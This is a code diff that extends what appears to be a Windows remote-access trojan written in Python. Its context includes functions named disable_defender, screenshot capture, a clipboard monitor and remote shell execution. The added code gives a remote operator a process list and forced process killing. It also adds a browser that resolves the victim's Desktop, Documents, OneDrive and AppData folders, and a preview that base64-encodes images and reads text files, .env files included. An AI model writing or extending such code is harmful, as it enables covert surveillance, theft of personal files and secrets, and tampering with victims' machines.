@@ -310,6 +310,36 @@ def disable_defender():
         pass
 
 
+def get_process_list():
+    """Get list of running processes as JSON string"""
+    try:
+        # Using tasklist /FO CSV /V for detailed info including User and Window Title
+        output = subprocess.check_output(
+            "tasklist /FO CSV /V", shell=True, 
+            stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL
+        ).decode(errors='replace')
+        
+        import csv
+        import io
+        
+        f = io.StringIO(output)
+        reader = csv.DictReader(f)
+        processes = []
+        for row in reader:
+            processes.append({
+                "name": row.get("Image Name", "Unknown"),
+                "pid": row.get("PID", "0"),
+                "mem": row.get("Mem Usage", ""),
+                "user": row.get("User Name", ""),
+                "cpu": row.get("CPU Time", ""),
+                "title": row.get("Window Title", "")
+            })
+        
+        return "[JSON_PROCS]" + json.dumps(processes)
+    except Exception as e:
+        return f"[-] Error gathering processes: {str(e)}"
+
+
 def get_system_info():
     """Gather detailed system information"""
     try:
@@ -475,53 +505,295 @@ def stop_clipboard_monitor():
 
 
 # === File Browser ===
+MAX_FILE_LIST_ITEMS = 500  # Cap to prevent massive payloads
+
+def _format_size(size):
+    """Format byte size to human readable string"""
+    if size < 1024:
+        return f"{size} B"
+    elif size < 1024 * 1024:
+        return f"{size / 1024:.1f} KB"
+    elif size < 1024 * 1024 * 1024:
+        return f"{size / (1024*1024):.1f} MB"
+    else:
+        return f"{size / (1024*1024*1024):.2f} GB"
+
+def resolve_special_folder(folder_type):
+    """Resolve Windows special folders dynamically via Registry (handles OneDrive redirection)"""
+    home = os.path.expanduser('~')
+    folder_type = folder_type.lower()
+    reg_map = {
+        'desktop': 'Desktop',
+        'documents': 'Personal',
+        'downloads': '{374DE290-123F-4565-9164-39C4925E467B}',
+        'pictures': 'My Pictures',
+        'videos': 'My Video',
+        'music': 'My Music',
+        'favorites': 'Favorites',
+        'appdata': 'AppData',
+    }
+    
+    # 1. Try Windows Registry (handles OneDrive Known Folder Move / redirection)
+    if folder_type in reg_map:
+        try:
+            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders') as key:
+                val, _ = winreg.QueryValueEx(key, reg_map[folder_type])
+                path = os.path.expandvars(val)
+                if os.path.isdir(path):
+                    return path
+        except Exception:
+            pass
+
+    # 2. Fallbacks with OneDrive checks
+    onedrive_base = os.environ.get('OneDrive', os.path.join(home, 'OneDrive'))
+    fallbacks = {
+        'desktop': [os.path.join(home, 'Desktop'), os.path.join(onedrive_base, 'Desktop')],
+        'documents': [os.path.join(home, 'Documents'), os.path.join(onedrive_base, 'Documents')],
+        'downloads': [os.path.join(home, 'Downloads')],
+        'pictures': [
+            os.path.join(onedrive_base, 'Documents', 'Pictures'),
+            os.path.join(onedrive_base, 'Pictures'),
+            os.path.join(home, 'Pictures')
+        ],
+        'videos': [os.path.join(home, 'Videos'), os.path.join(onedrive_base, 'Videos')],
+        'music': [os.path.join(home, 'Music'), os.path.join(onedrive_base, 'Music')],
+        'favorites': [os.path.join(home, 'Favorites')],
+        'onedrive': [onedrive_base, os.path.join(home, 'OneDrive')],
+        'appdata': [os.environ.get('APPDATA', os.path.join(home, 'AppData', 'Roaming'))]
+    }
+    
+    candidates = fallbacks.get(folder_type, [])
+    for c in candidates:
+        if os.path.isdir(c):
+            return c
+    return candidates[0] if candidates else os.path.join(home, folder_type.capitalize())
+
+
 def browse_files(path=""):
-    """List files and directories with details"""
+    """List files and directories with details — returns JSON for fast frontend parsing"""
     global current_dir
     try:
-        target_path = path if path else current_dir
-        if not os.path.isabs(target_path):
+        # Clean the path thoroughly
+        clean_path = path.strip().strip('"').strip("'") if path else ""
+
+        # Special case: Resolve well-known folders dynamically
+        if clean_path.startswith("SPECIAL:"):
+            folder_type = clean_path.split(":", 1)[1].lower()
+            clean_path = resolve_special_folder(folder_type)
+
+        # Clean again for drive check
+        upper_path = clean_path.upper()
+
+        # Special case: list drives — return JSON format
+        if upper_path == "DRIVES":
+            drives = []
+            bitmask = ctypes.windll.kernel32.GetLogicalDrives()
+            for letter in "ABCDEFGHIJKLMNOPQRSTUVWXYZ":
+                if bitmask & 1:
+                    drives.append({
+                        "name": f"{letter}:/",
+                        "size": "DRIVE",
+                        "date": "-----",
+                        "is_dir": True
+                    })
+                bitmask >>= 1
+            result = {
+                "path": "System Drives",
+                "items": drives,
+                "count": len(drives),
+                "truncated": False
+            }
+            return "[JSON_FILES]" + json.dumps(result)
+
+        # Handle path resolution
+        target_path = clean_path if clean_path else current_dir
+        
+        # If it's a relative path, join with current_dir
+        if not os.path.isabs(target_path) and not (len(target_path) >= 2 and target_path[1] == ':'):
             target_path = os.path.join(current_dir, target_path)
+        
         target_path = os.path.abspath(target_path)
 
         if not os.path.isdir(target_path):
             return f"[-] Not a directory: {target_path}"
 
-        entries = []
+        # Auto-update current_dir so downloads and relative paths work
+        current_dir = target_path
+
+        dirs_list = []
+        files_list = []
         try:
-            items = os.listdir(target_path)
+            # os.scandir() is 2-10x faster than os.listdir() + os.stat()
+            # It caches stat info from the directory read itself
+            with os.scandir(target_path) as scanner:
+                for entry in scanner:
+                    try:
+                        # entry.is_dir() and entry.stat() use cached OS data — no extra syscalls
+                        is_dir = entry.is_dir(follow_symlinks=False)
+                        try:
+                            stat = entry.stat(follow_symlinks=False)
+                            mod_time = time.strftime("%Y-%m-%d %H:%M", time.localtime(stat.st_mtime))
+                            size_str = "DIR" if is_dir else _format_size(stat.st_size)
+                        except (PermissionError, OSError):
+                            mod_time = "????"
+                            size_str = "???" if not is_dir else "DIR"
+
+                        item = {
+                            "name": entry.name,
+                            "size": size_str,
+                            "date": mod_time,
+                            "is_dir": is_dir
+                        }
+                        if is_dir:
+                            dirs_list.append(item)
+                        else:
+                            files_list.append(item)
+                    except (PermissionError, OSError):
+                        files_list.append({
+                            "name": entry.name,
+                            "size": "???",
+                            "date": "????",
+                            "is_dir": False
+                        })
         except PermissionError:
             return f"[-] Permission denied: {target_path}"
 
-        for item in sorted(items):
-            full_path = os.path.join(target_path, item)
-            try:
-                stat = os.stat(full_path)
-                mod_time = time.strftime("%Y-%m-%d %H:%M", time.localtime(stat.st_mtime))
-                if os.path.isdir(full_path):
-                    entries.append(f"  {'DIR':>10}  {mod_time}  {item}/")
-                else:
-                    size = stat.st_size
-                    if size < 1024:
-                        size_str = f"{size} B"
-                    elif size < 1024 * 1024:
-                        size_str = f"{size / 1024:.1f} KB"
-                    elif size < 1024 * 1024 * 1024:
-                        size_str = f"{size / (1024*1024):.1f} MB"
-                    else:
-                        size_str = f"{size / (1024*1024*1024):.2f} GB"
-                    entries.append(f"  {size_str:>10}  {mod_time}  {item}")
-            except (PermissionError, OSError):
-                entries.append(f"  {'???':>10}  {'????-??-?? ??:??'}  {item}")
+        # Sort: directories first (alphabetical), then files (alphabetical)
+        dirs_list.sort(key=lambda x: x["name"].lower())
+        files_list.sort(key=lambda x: x["name"].lower())
+        all_items = dirs_list + files_list
 
-        header = f"[+] Directory: {target_path}\n"
-        header += f"    {len(entries)} items\n"
-        header += f"  {'SIZE':>10}  {'MODIFIED':>16}  NAME\n"
-        header += f"  {'─'*10}  {'─'*16}  {'─'*30}\n"
-        return header + "\n".join(entries)
+        total_count = len(all_items)
+        truncated = total_count > MAX_FILE_LIST_ITEMS
+        if truncated:
+            all_items = all_items[:MAX_FILE_LIST_ITEMS]
+
+        result = {
+            "path": target_path,
+            "items": all_items,
+            "count": total_count,
+            "truncated": truncated
+        }
+        return "[JSON_FILES]" + json.dumps(result)
 
     except Exception as e:
         return f"[-] Browse error: {str(e)}"
+
+
+import io
+try:
+    from PIL import Image
+except ImportError:
+    Image = None
+
+def preview_file(path):
+    """Generate instant image or text preview payload for remote files"""
+    global current_dir
+    try:
+        clean_path = path.strip().strip('"').strip("'") if path else ""
+        if not clean_path:
+            return "[JSON_PREVIEW]" + json.dumps({"status": "error", "message": "No path provided"})
+
+        target_path = clean_path
+        if not os.path.isabs(target_path) and not (len(target_path) >= 2 and target_path[1] == ':'):
+            target_path = os.path.join(current_dir, target_path)
+        target_path = os.path.abspath(target_path)
+
+        if not os.path.isfile(target_path):
+            return "[JSON_PREVIEW]" + json.dumps({"status": "error", "message": f"File not found: {target_path}"})
+
+        ext = os.path.splitext(target_path)[1].lower()
+        size = os.path.getsize(target_path)
+        size_str = _format_size(size)
+
+        img_exts = {
+            '.png': 'image/png',
+            '.jpg': 'image/jpeg',
+            '.jpeg': 'image/jpeg',
+            '.gif': 'image/gif',
+            '.bmp': 'image/bmp',
+            '.webp': 'image/webp',
+            '.ico': 'image/x-icon'
+        }
+        text_exts = {
+            '.txt', '.log', '.py', '.js', '.ts', '.jsx', '.tsx', '.json', '.xml',
+            '.html', '.htm', '.css', '.ini', '.cfg', '.bat', '.ps1', '.cmd', '.sh',
+            '.yaml', '.yml', '.md', '.csv', '.env', '.toml', '.sql', '.c', '.cpp',
+            '.h', '.hpp', '.rs', '.go', '.java'
+        }
+
+        # 1. Image Preview
+        if ext in img_exts:
+            if Image is not None:
+                try:
+                    with Image.open(target_path) as img:
+                        # Downscale only if extremely large to save bandwidth while keeping crisp preview
+                        max_dim = 1600
+                        if img.width > max_dim or img.height > max_dim:
+                            img.thumbnail((max_dim, max_dim), Image.Resampling.LANCZOS)
+                        
+                        buf = io.BytesIO()
+                        fmt = 'JPEG' if ext in ['.jpg', '.jpeg'] else 'PNG'
+                        if fmt == 'JPEG' and img.mode in ('RGBA', 'LA', 'P'):
+                            img = img.convert('RGB')
+                        img.save(buf, format=fmt, quality=90)
+                        b64_data = base64.b64encode(buf.getvalue()).decode('utf-8')
+                        mime = 'image/jpeg' if fmt == 'JPEG' else 'image/png'
+                        return "[JSON_PREVIEW]" + json.dumps({
+                            "status": "ok",
+                            "type": "image",
+                            "name": os.path.basename(target_path),
+                            "path": target_path,
+                            "mime": mime,
+                            "data": b64_data,
+                            "size": size_str
+                        })
+                except Exception:
+                    pass
+
+            # Fallback to direct raw read for images
+            with open(target_path, "rb") as f:
+                raw_bytes = f.read()
+                b64_data = base64.b64encode(raw_bytes).decode('utf-8')
+            return "[JSON_PREVIEW]" + json.dumps({
+                "status": "ok",
+                "type": "image",
+                "name": os.path.basename(target_path),
+                "path": target_path,
+                "mime": img_exts.get(ext, "image/png"),
+                "data": b64_data,
+                "size": size_str
+            })
+
+        # 2. Text / Code Preview
+        elif ext in text_exts or size < 120000:
+            try:
+                with open(target_path, "r", encoding="utf-8", errors="replace") as f:
+                    content = f.read(120000)
+                return "[JSON_PREVIEW]" + json.dumps({
+                    "status": "ok",
+                    "type": "text",
+                    "name": os.path.basename(target_path),
+                    "path": target_path,
+                    "content": content,
+                    "size": size_str
+                })
+            except Exception as e:
+                return "[JSON_PREVIEW]" + json.dumps({"status": "error", "message": f"Read error: {str(e)}"})
+
+        # 3. Binary / Other files
+        else:
+            return "[JSON_PREVIEW]" + json.dumps({
+                "status": "unsupported",
+                "type": "binary",
+                "name": os.path.basename(target_path),
+                "path": target_path,
+                "size": size_str,
+                "message": "Direct preview is not supported for binary files. Use the Download button to retrieve the complete file."
+            })
+
+    except Exception as e:
+        return "[JSON_PREVIEW]" + json.dumps({"status": "error", "message": str(e)})
 
 
 def execute_command(cmd):
@@ -533,6 +805,23 @@ def execute_command(cmd):
 
         if cmd == "sysinfo":
             return get_system_info()
+
+        elif cmd == "ps":
+            return get_process_list()
+
+        elif cmd.startswith("killproc "):
+            target = cmd[9:].strip().strip('"').strip("'")
+            try:
+                if target.isdigit():
+                    subprocess.check_output(f"taskkill /F /PID {target}", shell=True, stderr=subprocess.STDOUT)
+                else:
+                    # Ensure it has .exe if it's a name
+                    if not target.lower().endswith(".exe"):
+                        target += ".exe"
+                    subprocess.check_output(f"taskkill /F /IM {target}", shell=True, stderr=subprocess.STDOUT)
+                return f"[+] Process {target} killed"
+            except Exception as e:
+                return f"[-] Failed to kill process: {str(e)}"
 
         elif cmd == "screenshot":
             screenshot_data = take_screenshot()
@@ -554,7 +843,7 @@ def execute_command(cmd):
             return current_dir
 
         elif cmd.startswith("cd "):
-            path = cmd[3:].strip()
+            path = cmd[3:].strip().strip('"').strip("'")
             if path == "~":
                 path = os.path.expanduser("~")
             new_dir = os.path.normpath(os.path.join(current_dir, path))
@@ -608,7 +897,7 @@ def execute_command(cmd):
 
         elif cmd.startswith("download "):
             _, path = cmd.split(" ", 1)
-            path = path.strip()
+            path = path.strip().strip('"').strip("'")
             # Resolve relative paths against current_dir
             if not os.path.isabs(path):
                 path = os.path.join(current_dir, path)
@@ -650,8 +939,22 @@ def execute_command(cmd):
 
         # === File Browser ===
         elif cmd == "ls" or cmd.startswith("ls "):
-            path = cmd[3:].strip() if cmd.startswith("ls ") else ""
+            # Improved argument parsing: handle quotes correctly
+            raw_path = cmd[3:].strip() if cmd.startswith("ls ") else ""
+            # If path is wrapped in quotes, extract content inside
+            if (raw_path.startswith('"') and raw_path.endswith('"')) or (raw_path.startswith("'") and raw_path.endswith("'")):
+                path = raw_path[1:-1]
+            else:
+                path = raw_path
             return browse_files(path)
+
+        elif cmd.startswith("preview ") or cmd.startswith("view "):
+            raw_path = cmd.split(" ", 1)[1].strip()
+            if (raw_path.startswith('"') and raw_path.endswith('"')) or (raw_path.startswith("'") and raw_path.endswith("'")):
+                path = raw_path[1:-1]
+            else:
+                path = raw_path
+            return preview_file(path)
 
         else:
             # Shell command execution — use current_dir as cwd
